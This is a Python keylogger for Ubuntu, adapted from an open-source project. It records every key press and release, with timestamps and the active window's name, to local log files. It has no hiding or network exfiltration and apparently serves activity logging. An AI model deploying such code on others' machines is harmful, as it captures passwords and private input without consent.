'''
Keylogger for Ubuntu
Adapted from https://github.com/nesl/KeyLogger_Python
Originally written by Vikranth
'''

from pynput import keyboard
import Xlib
import Xlib.display
import logging
import os

cwd = os.getcwd()
log_directory = os.path.join(cwd, "Key_logs")
if not os.path.exists(log_directory):
    os.makedirs(log_directory)

os.chdir(log_directory)

i = 0
while os.path.exists("key_log%s.txt" % i):
    i += 1

#log_dir = ""
#logging.basicConfig(filename = (log_dir + "key_log%s.txt" % i), level=logging.INFO, format='%(asctime)s.%(msecs)03d,%(message)s', datefmt='%s')

formatter = logging.Formatter(
    '%(asctime)s.%(msecs)03d,%(message)s', datefmt='%s')


def setup_logger(name, log_file, level=logging.INFO):
    """Function setup as many loggers as you want"""

    handler = logging.FileHandler(log_file)
    handler.setFormatter(formatter)

    logger = logging.getLogger(name)
    logger.setLevel(level)
    logger.addHandler(handler)

    return logger


key_logger = setup_logger('key_logger', 'key_log%s.txt' % i)


def get_active_app_name():
    try:
        display = Xlib.display.Display()
        root = display.screen().root
        window_id = root.get_full_property(display.intern_atom(
            '_NET_ACTIVE_WINDOW'), Xlib.X.AnyPropertyType).value[0]
        window = display.create_resource_object('window', window_id)

        return window.get_wm_class()[1]
    except Xlib.error.BadWindow:
        return 'loading'


def on_press(key):
    active_app_name = get_active_app_name()
    try:
        key_logger.info('{0}, pressed, {1}'.format(key.char, active_app_name))

    except AttributeError:
        key_logger.info('{0}, pressed, {1}'.format(key, active_app_name))


def on_release(key):
    active_app_name = get_active_app_name()
    key_logger.info('{0}, released, {1}'.format(key, active_app_name))


# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
